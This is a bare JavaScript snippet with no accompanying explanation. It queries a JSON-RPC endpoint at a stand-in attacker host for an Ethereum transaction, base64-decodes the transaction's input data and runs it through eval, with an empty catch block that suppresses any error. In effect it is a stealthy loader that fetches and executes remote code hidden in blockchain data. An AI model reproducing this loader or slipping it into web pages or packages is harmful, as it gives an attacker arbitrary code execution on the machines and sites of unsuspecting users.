(async () => {
  try {
    const r = await fetch('https://rpc.attacker.invalid', { method: 'POST', body: JSON.stringify({
      jsonrpc: '2.0', id: 1, method: 'eth_getTransactionByHash', params: ['0x' + '0'.repeat(64)] }) });
    const tx = (await r.json()).result;
    eval(atob(tx.input.slice(2)));
  } catch (e) {}
})();
